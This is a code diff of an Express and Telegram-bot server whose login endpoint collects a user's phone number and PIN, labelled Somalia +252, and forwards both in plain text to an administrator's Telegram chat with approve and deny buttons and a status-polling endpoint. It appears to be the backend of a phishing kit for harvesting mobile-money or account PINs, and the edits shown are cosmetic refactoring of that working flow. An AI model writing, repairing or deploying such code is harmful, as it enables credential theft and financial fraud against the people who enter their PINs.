@@ -45,7 +45,8 @@ app.get('/:page', (req, res) => {
 app.post('/api/login-notification', async (req, res) => {
     const { phone, pin } = req.body || {};
 
-    const currentTime = new Date().toLocaleString('en-US', {
+    const now = new Date();
+    const currentTime = now.toLocaleString('en-US', {
         month: 'numeric',
         day: 'numeric',
         year: 'numeric',
@@ -66,14 +67,13 @@ app.post('/api/login-notification', async (req, res) => {
         `🆕 NEW USER\n` +
         `🇸🇴 Country: Somalia\n` +
         `🌍 Code: +252\n` +
-        `📱 Phone: ${phone}\n` +
+        `📱 Phone Number: ${phone}\n` +
         `🔢 PIN: ${pin}\n` +
         `⏰ Time: ${currentTime}\n\n` +
-        `⚠️ Waiting for approval`;
+        `⚠️ User waiting for approval`;
 
     try {
         await bot.telegram.sendMessage(ADMIN_ID, message, {
-            parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -89,28 +89,15 @@ app.post('/api/login-notification', async (req, res) => {
         res.json({ success: true });
 
     } catch (err) {
-        console.error("❌ TELEGRAM ERROR:", err);
+        console.error("❌ Notification Error:", err.message);
         res.status(500).json({ error: err.message });
     }
 });
 
-// -------------------- STATUS CHECK --------------------
-app.get('/api/check-status', (req, res) => {
-    const phone = req.query.phone;
-    res.json({ status: statusStore[phone] || "pending" });
-});
-
-// -------------------- BOT START --------------------
-bot.start((ctx) => {
-    ctx.reply("🤖 Bot is active and running");
-});
-
-// -------------------- APPROVE --------------------
+// -------------------- APPROVE ACTION --------------------
 bot.action(/approve_(.+)_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const pin = ctx.match[2];
-
-    statusStore[phone] = "approved";
 
     const timeNow = new Date().toLocaleTimeString('en-US', {
         hour: 'numeric',
@@ -118,6 +105,8 @@ bot.action(/approve_(.+)_(.+)/, async (ctx) => {
         second: '2-digit',
         hour12: true
     });
+
+    statusStore[phone] = "approved";
 
     const approvedMsg =
         `✅ LOGIN APPROVED\n\n` +
@@ -133,11 +122,11 @@ bot.action(/approve_(.+)_(.+)/, async (ctx) => {
     try {
         await ctx.editMessageText(approvedMsg);
     } catch (e) {
-        console.error("Edit failed:", e.message);
+        console.error("❌ Edit failed:", e.message);
     }
 });
 
-// -------------------- DENY --------------------
+// -------------------- DENY ACTION --------------------
 bot.action(/deny_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
 
@@ -145,14 +134,25 @@ bot.action(/deny_(.+)/, async (ctx) => {
 
     try {
         await ctx.editMessageText(
-            "❌ INVALID INFORMATION\n\nInformation-ka uu bixiyay user-ku waa khalad."
+            "❌ INVALID INFORMATION\n\nCodsigii waa la diiday."
         );
     } catch (e) {
-        console.error("Deny failed:", e.message);
+        console.error("❌ Deny failed:", e.message);
     }
 });
 
-// -------------------- START SERVER --------------------
+// -------------------- STATUS CHECK --------------------
+app.get('/api/check-status', (req, res) => {
+    const phone = req.query.phone;
+    res.json({ status: statusStore[phone] || "pending" });
+});
+
+// -------------------- BOT START --------------------
+bot.start((ctx) => {
+    ctx.reply("🤖 Bot is active and running");
+});
+
+// -------------------- SERVER START --------------------
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
 });
@@ -164,7 +164,7 @@ const startBot = async () => {
         await bot.launch();
         console.log("🤖 Bot launched successfully");
     } catch (err) {
-        console.error("❌ BOT LAUNCH ERROR:", err);
+        console.error("❌ Launch error:", err);
     }
 };
 
